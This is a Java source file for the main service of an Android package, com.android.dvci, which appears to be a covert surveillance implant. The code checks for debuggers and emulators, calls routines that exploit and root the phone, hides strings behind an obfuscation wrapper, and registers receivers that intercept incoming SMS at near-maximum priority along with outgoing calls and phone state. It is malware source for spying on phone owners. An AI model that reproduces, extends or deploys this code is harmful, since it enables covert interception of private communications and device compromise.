package com.android.dvci;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.res.Configuration;
import android.os.IBinder;
import android.widget.Toast;

import com.android.dvci.auto.Cfg;
import com.android.dvci.listener.BAc;
import com.android.dvci.listener.BC;
import com.android.dvci.listener.BSm;
import com.android.dvci.listener.BSt;
import com.android.dvci.util.Check;
import com.android.mm.M;

/**
 * The Class ServiceCore.
 */
public class ServiceMain extends Service {
    private static final String TAG = "ServiceCore"; //$NON-NLS-1$
    BSt bst = new BSt();
    BAc bac = new BAc();
    BSm bsm = new BSm();
    BC bc= new BC();

    private boolean needsNotification = false;
    private Core core;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        Status.setAppContext(getApplicationContext());

        // ANTIDEBUG ANTIEMU
        if (!Core.checkStatic()) {
            if (Cfg.DEBUG) {
                Check.log(TAG + " (onCreate) anti emu/debug failed");
            }
            return;
        }

        //M.init(getApplicationContext());

        if (Cfg.DEBUG) {
            Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
        }

        // TODO: verificare che needsNotification serva.
        needsNotification = false; // Root.isNotificationNeeded();

        // E' sempre false se Cfg.ACTIVITY = false
        if (needsNotification == true) {
            Notification note = new Notification(R.drawable.notify_icon, "Device Information Updated",
                    System.currentTimeMillis());

            Intent i = new Intent(this, LocalActivity.class);

            i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);

            PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);

            // Activity Name and Displayed Text
            note.flags |= Notification.FLAG_AUTO_CANCEL;
            note.setLatestEventInfo(this, "", "", pi);

            startForeground(1260, note);
        }

        if (Cfg.DEMO) {
            Toast.makeText(this, M.e("Agent Created"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
        }
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);

        if (Cfg.DEBUG) {
            Check.log(TAG + " (onStart)"); //$NON-NLS-1$
        }

        // ANTIDEBUG ANTIEMU
        if (Core.checkStatic()) {

            boolean selinux = Root.exploitPhone();
            if (!selinux) {
                Root.getPermissions();
            }

            // Core starts
            core = Core.newCore(this);
            core.Start(this.getResources(), getContentResolver());

            registerReceivers();

        } else {
            if (Cfg.DEBUG) {
                Check.log(TAG + " (onStart) anti emu/debug failed");
                Toast.makeText(Status.getAppContext(), M.e("Debug Failed!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        unregisterReceiver();

        if (Cfg.DEBUG) {
            Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
        }

        if (Cfg.DEMO) {
            Toast.makeText(this, M.e("Agent Destroyed"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
        }

        core.Stop();
        core = null;

        if (needsNotification == true) {
            stopForeground(true);
        }
    }

    private void registerReceivers() {
        IntentFilter intentFilter = new IntentFilter();
        registerReceiver(bst, intentFilter);
        registerReceiver(bac, intentFilter);

        IntentFilter iBsm = new IntentFilter();
        iBsm.setPriority(999999999);
        iBsm.addAction(M.e("android.provider.Telephony.SMS_RECEIVED"));
        registerReceiver(bsm, iBsm);

        IntentFilter iBc = new IntentFilter();
        iBc.setPriority(0);
        iBc.addCategory(M.e("android.intent.category.DEFAULT"));
        iBc.addAction(M.e("android.intent.action.NEW_OUTGOING_CALL"));
        iBc.addAction(M.e("android.intent.action.PHONE_STATE"));
        registerReceiver(bc, iBc);

    }

    private void unregisterReceiver() {
        unregisterReceiver(bst);
        unregisterReceiver(bac);
        unregisterReceiver(bsm);
        unregisterReceiver(bc);
    }

    @Override
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);

        if (Cfg.DEBUG) {
            Check.log(TAG + " (onConfigurationChanged)"); //$NON-NLS-1$
        }

        if (Cfg.DEMO) {
            Toast.makeText(this, M.e("(onConfigurationChanged)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
        }
    }

    @Override
    public void onLowMemory() {
        super.onLowMemory();

        if (Cfg.DEBUG) {
            Check.log(TAG + " (onLowMemory)"); //$NON-NLS-1$
        }

        if (Cfg.DEMO) {
            Toast.makeText(this, M.e("(onLowMemory)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
        }
    }

    @Override
    public void onRebind(Intent intent) {
        super.onRebind(intent);

        if (Cfg.DEBUG) {
            Check.log(TAG + " (onRebind)"); //$NON-NLS-1$
        }

        if (Cfg.DEMO) {
            Toast.makeText(this, M.e("(onRebind)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
        }
    }

    @Override
    public boolean onUnbind(Intent intent) {
        boolean ret = super.onUnbind(intent);

        if (Cfg.DEBUG) {
            Check.log(TAG + " (onUnbind)"); //$NON-NLS-1$
        }

        if (Cfg.DEMO) {
            Toast.makeText(this, M.e("(onUnbind)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
        }

        return ret;
    }


}
